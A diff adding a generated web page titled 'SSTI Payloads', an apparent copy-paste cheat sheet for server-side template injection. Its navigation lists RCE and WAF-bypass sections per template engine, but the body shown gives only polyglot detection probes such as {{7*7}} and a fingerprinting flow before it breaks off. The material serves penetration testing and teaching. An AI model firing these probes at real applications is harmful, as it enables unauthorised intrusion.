+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#blind-detection_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Blind Detection
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#waf-bypass_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        WAF Bypass
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#freemarker-java" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Freemarker (Java)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Freemarker (Java)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#detection_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Detection
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rce_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        RCE
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#blind-detection_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Blind Detection
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#velocity-java" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Velocity (Java)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Velocity (Java)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#detection_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Detection
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rce_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        RCE
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#blind-detection_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Blind Detection
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#smarty-php" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Smarty (PHP)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Smarty (PHP)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#detection_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Detection
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rce_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        RCE
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#blind-detection_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Blind Detection
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#mako-python" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Mako (Python)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Mako (Python)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#detection_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Detection
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rce_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        RCE
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#blind-detection_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Blind Detection
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#erb-ruby" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ERB (Ruby)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="ERB (Ruby)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#detection_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Detection
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rce_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        RCE
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#blind-detection_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Blind Detection
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#pebble-java" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Pebble (Java)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Pebble (Java)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#detection_7" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Detection
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rce_7" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        RCE
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#thymeleaf-java" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Thymeleaf (Java)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Thymeleaf (Java)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#detection_8" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Detection
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rce_8" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        RCE
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#blind-detection_7" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Blind Detection
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#el-expression-language-java" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        EL (Expression Language - Java)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="EL (Expression Language - Java)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#detection_9" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Detection
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rce_9" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        RCE
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#generic-waf-bypasses" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Generic WAF Bypasses
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Generic WAF Bypasses">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#unicodehex" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Unicode/Hex
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#whitespace-alternatives" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Whitespace Alternatives
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#string-obfuscation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        String Obfuscation
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#character-building" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Character Building
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#common-vulnerable-patterns" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Common Vulnerable Patterns
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Common Vulnerable Patterns">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#pythonflask" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Python/Flask
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#phptwig" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        PHP/Twig
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#javafreemarker" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Java/Freemarker
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rubyerb" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Ruby/ERB
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#blind-ssti-detection-techniques" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Blind SSTI Detection Techniques
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Blind SSTI Detection Techniques">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#time-based" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Time-Based
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#dnshttp-callback" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        DNS/HTTP Callback
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#file-creation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        File Creation
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#template-engine-fingerprinting" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Template Engine Fingerprinting
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../lfi/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    LFI
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../nosql/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    NoSQL
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../idor/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    IDOR
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../auth/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Auth/JWT/OAuth
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../llm/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    LLM/AI
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../deserialization/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Deserialization
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../bypasses/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Bypasses
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../vulns/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🔥 Vulnerabilities
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../chains/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ⛓️ Chains
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../frameworks/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🛠️ Frameworks
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../tags/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🏷️ Tags
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#detection-polyglot" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Detection (Polyglot)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Detection (Polyglot)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#detection-flow" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Detection Flow
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#jinja2-python" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Jinja2 (Python)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Jinja2 (Python)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#detection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Detection
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rce" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        RCE
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#blind-detection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Blind Detection
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#waf-bypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        WAF Bypass
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#twig-php" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Twig (PHP)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Twig (PHP)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#detection_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Detection
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rce_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        RCE
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#blind-detection_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Blind Detection
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#waf-bypass_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        WAF Bypass
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#freemarker-java" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Freemarker (Java)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Freemarker (Java)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#detection_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Detection
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rce_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        RCE
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#blind-detection_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Blind Detection
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#velocity-java" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Velocity (Java)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Velocity (Java)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#detection_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Detection
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rce_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        RCE
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#blind-detection_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Blind Detection
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#smarty-php" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Smarty (PHP)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Smarty (PHP)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#detection_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Detection
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rce_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        RCE
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#blind-detection_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Blind Detection
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#mako-python" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Mako (Python)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Mako (Python)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#detection_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Detection
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rce_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        RCE
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#blind-detection_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Blind Detection
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#erb-ruby" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ERB (Ruby)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="ERB (Ruby)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#detection_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Detection
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rce_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        RCE
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#blind-detection_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Blind Detection
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#pebble-java" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Pebble (Java)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Pebble (Java)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#detection_7" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Detection
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rce_7" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        RCE
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#thymeleaf-java" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Thymeleaf (Java)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Thymeleaf (Java)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#detection_8" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Detection
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rce_8" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        RCE
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#blind-detection_7" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Blind Detection
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#el-expression-language-java" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        EL (Expression Language - Java)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="EL (Expression Language - Java)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#detection_9" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Detection
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rce_9" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        RCE
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#generic-waf-bypasses" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Generic WAF Bypasses
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Generic WAF Bypasses">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#unicodehex" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Unicode/Hex
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#whitespace-alternatives" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Whitespace Alternatives
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#string-obfuscation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        String Obfuscation
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#character-building" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Character Building
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#common-vulnerable-patterns" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Common Vulnerable Patterns
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Common Vulnerable Patterns">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#pythonflask" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Python/Flask
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#phptwig" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        PHP/Twig
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#javafreemarker" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Java/Freemarker
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rubyerb" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Ruby/ERB
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#blind-ssti-detection-techniques" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Blind SSTI Detection Techniques
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Blind SSTI Detection Techniques">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#time-based" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Time-Based
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#dnshttp-callback" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        DNS/HTTP Callback
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#file-creation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        File Creation
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#template-engine-fingerprinting" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Template Engine Fingerprinting
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="ssti-payloads">SSTI Payloads<a class="headerlink" href="#ssti-payloads" title="Permanent link">&para;</a></h1>
+<p>Quick reference by template engine. Copy-paste ready.</p>
+<hr />
+<p>tags:
+  - ssti
+  - template-injection
+  - rce
+  - payloads</p>
+<hr />
+<h2 id="detection-polyglot">Detection (Polyglot)<a class="headerlink" href="#detection-polyglot" title="Permanent link">&para;</a></h2>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>${{&lt;%[%&#39;&quot;}}%\.
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>{{7*7}}
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>${7*7}
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>&lt;%= 7*7 %&gt;
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>#{7*7}
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>*{7*7}
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>@(7*7)
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>${&quot;z&quot;.join(&quot;ab&quot;)}
+</span></code></pre></div>
+<h3 id="detection-flow">Detection Flow<a class="headerlink" href="#detection-flow" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>${7*7} → 49? → Check EL/Mako/Velocity
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>{{7*7}} → 49? → Check Jinja2/Twig/Nunjucks
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>&lt;%= 7*7 %&gt; → 49? → Check ERB/EJS
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>#{7*7} → 49? → Check Pebble/Thymeleaf
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>*{7*7} → 49? → Check Thymeleaf
+</span></code></pre></div>
+<hr />
+<h2 id="jinja2-python">Jinja2 (Python)<a class="headerlink" href="#jinja2-python" title="Permanent link">&para;</a></h2>
+<h3 id="detection">Detection<a class="headerlink" href="#detection" title="Permanent link">&para;</a></h3>
